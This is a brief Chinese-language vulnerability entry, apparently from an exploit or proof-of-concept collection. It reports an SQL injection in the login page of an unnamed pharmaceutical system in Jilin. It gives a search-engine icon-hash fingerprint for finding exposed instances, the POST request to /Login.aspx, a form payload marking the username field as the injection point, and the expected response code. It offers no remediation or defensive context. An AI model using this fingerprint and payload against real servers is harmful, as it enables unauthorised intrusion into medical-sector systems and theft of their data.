# 吉林某医药系统存在SQL注入漏洞

吉林某医药系统 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="775044030"`
- **请求**：`POST /Login.aspx HTTP/1.1`

**Payload**
```
__VIEWSTATE=%2FwEPDwUKLTY0OTc3MzY5OA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICAw9kFgICBA8WAh4JaW5uZXJodG1sBSHlkInmnpfnnIHogZrliJvljLvoja%2FmnInpmZDlhazlj7hkZFiU%2FDEzLkPCmDf498pGBLrtD3FC5XsVsdyX0eaNHaa1&tbUser=admin（注入点）&tbPassword=admin&btnLogin=+%B5%C7+%C2%BC+&hfSubmit=&__VIEWSTATEGENERATOR=C2EE9ABB
```
- **响应特征**：200